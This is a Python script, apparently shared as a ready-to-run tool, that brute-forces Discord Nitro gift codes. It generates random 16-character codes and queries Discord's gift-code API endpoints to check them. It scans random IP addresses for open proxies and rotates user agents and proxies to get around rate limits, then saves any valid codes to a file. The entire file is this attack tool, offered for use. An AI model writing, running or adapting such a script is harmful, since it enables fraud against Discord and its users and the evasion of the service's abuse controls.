print("""
#############################
# Discord Nitro BruteForcer #
# Created By BORNG          #
#############################
""")

import os, random, requests
from concurrent import futures as t

class random_nitro:

    def user_agent(self):

        arr = [
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.0.12) Gecko/2009070611 Firefox/3.0.12 (.NET CLR 3.5.30729)",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.464.0 Safari/534.3",
            "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_8; ja-jp) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16",
            "Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0",
            "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.1 (KHTML, like Gecko) Chrome/6.0.427.0 Safari/534.1"
        ]
        return arr[random.randint(0,len(arr)-1)]

    def generate_proxy(self):
        
        try:

            dot1 = random.randint(1, 255)
            dot2 = random.randint(0, 255)
            dot3 = random.randint(0, 255)
            dot4 = random.randint(0, 255)
            ip = "{}.{}.{}.{}".format(dot1, dot2, dot3, dot4)
            proxy_raw = "{}:{}".format(ip, self.proxy_port)
            head = {
                "User-Agent": self.user_agent()
            }
            proxy = {
                "http": "http://{}".format(proxy_raw),
                "https": "https://{}".format(proxy_raw)
            }
            r = requests.get(url="https://discord.com/", headers=head, proxies=proxy, timeout=int(self.opt['timeout']))

            if 'discord' in r.text.lower():

                print("[+] [PROXY HUNTER] [CONNECTED] [{}]".format(proxy_raw))
                self.proxy_use = proxy_raw

            else:

                print("[-] [PROXY HUNTER] [FAILED CONNECT] [{}]".format(proxy_raw))

        except:

            print("[-] [PROXY HUNTER] [ERROR] [{}]".format(proxy_raw))

    def random_code(self, digit):

        result = ""
        str_word = "01233456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

        for x in range(digit):

            result += str_word[random.randint(0, len(str_word) - 1)]

        return result

    def valid_check(self):

        try:

            code = self.random_code(16)
            random_url_check = [
                "https://discordapp.com/api/v8/entitlements/gift-codes/{}?with_application=false&with_subscription_plan=true".format(code),
                "https://discordapp.com/api/v8/entitlements/gift-codes/{}".format(code),
                "https://discordapp.com/api/v6/entitlements/gift-codes/{}".format(code),
                "https://discordapp.com/api/v6/entitlements/gift-codes/{}?with_application=false&with_subscription_plan=true".format(code),
                "https://discord.com/api/v8/entitlements/gift-codes/{}?with_application=true&with_subscription_plan=true".format(code),
                "https://discord.com/api/v6/entitlements/gift-codes/{}?with_application=true&with_subscription_plan=true".format(code),
                "https://discord.com/api/v8/entitlements/gift-codes/{}".format(code),
                "https://discord.com/api/v8/entitlements/gift-codes/{}".format(code)

            ]
            url_check = random_url_check[random.randint(0, len(random_url_check) - 1)]
            r = requests.Session()
            header_check = {
                "User-Agent": self.user_agent()
            }
            proxy_raw = self.proxy_use
            proxy_set = {
                "http": "http://{}".format(proxy_raw),
                "https": "https://{}".format(proxy_raw)
            }
            x = r.get(url=url_check, headers=header_check, allow_redirects=True, verify=True, timeout=self.opt['timeout'], proxies=proxy_set)

            if x.status_code == 200:

                print("[+] [VALID] [Proxy: {}] [{}]".format(proxy_raw, code))
                open(self.opt['save'], 'a').write("{}\n".format(code))

            elif x.status_code == 404:

                print("[-] [INVALID] [Proxy: {}] [{}]".format(proxy_raw, code))

                if self.auto_proxy == True:

                    self.auto_proxy_set = ''

                elif self.auto_proxy == False:

                    self.proxy_selector()

                else:

                    exit()

            elif x.status_code == 429:

                print("[-] [LIMIT] [Proxy: {}] [{}]".format(proxy_raw, code))

                if self.auto_proxy == True:

                    self.auto_proxy_set = ''

                elif self.auto_proxy == False:

                    self.proxy_selector()

                else:

                    exit()

            else:

                print("[-] [ERROR] [Proxy: {}] [{}]".format(proxy_raw, code))
                
                if self.auto_proxy == True:

                    self.auto_proxy_set = ''

                elif self.auto_proxy == False:

                    self.proxy_selector()

                else:

                    exit()

        except:

            print("[-] [NETWORK ERROR] [Proxy: {}] [{}]".format(proxy_raw, code))
            self.proxy_selector()

    def proxy_selector(self):

        proxy_total = len(self.proxy_array) - 1

        if self.proxy_count == proxy_total:

            self.proxy_count = 0

        else:

            self.proxy_count += 1

        self.proxy_use = self.proxy_array[self.proxy_count]

    def executor(self):

        while (True):
        
            if self.auto_proxy == True:

                if not self.auto_proxy_set:

                    t.ThreadPoolExecutor(max_workers=int(self.opt['thread'])).submit(self.generate_proxy)

                else:

                    t.ThreadPoolExecutor(max_workers=int(self.opt['thread'])).submit(self.valid_check)

            elif self.auto_proxy == False:

                t.ThreadPoolExecutor(max_workers=int(self.opt['thread'])).submit(self.valid_check)

            else:

                print("[*] [ERROR]")
                exit()

    def __init__(self):

        self.auto_proxy_set = ''
        self.proxy_count = 0
        self.proxy_use_count = 0
        self.reload_proxy = False
        self.opt = {
            "proxy": input("[*] [Proxy File ( Empty if using automatic proxy )] : ")
        }

        if not self.opt['proxy']:

            self.proxy_port = input("[*] [PROXY PORT] : ")
            self.auto_proxy = True

        else:

            self.proxy_array = open(self.opt['proxy'], 'r', encoding="UTF-8").read().splitlines()
            self.proxy_selector()
            self.auto_proxy = False

        self.opt = {
            "timeout": int(input("[*] [TIMEOUT] : ")),
            "thread": int(input("[*] [THREAD] : ")),
            "save": input("[*] [SAVE FILE] : ")
        }
        print("\n")
        self.executor()

random_nitro()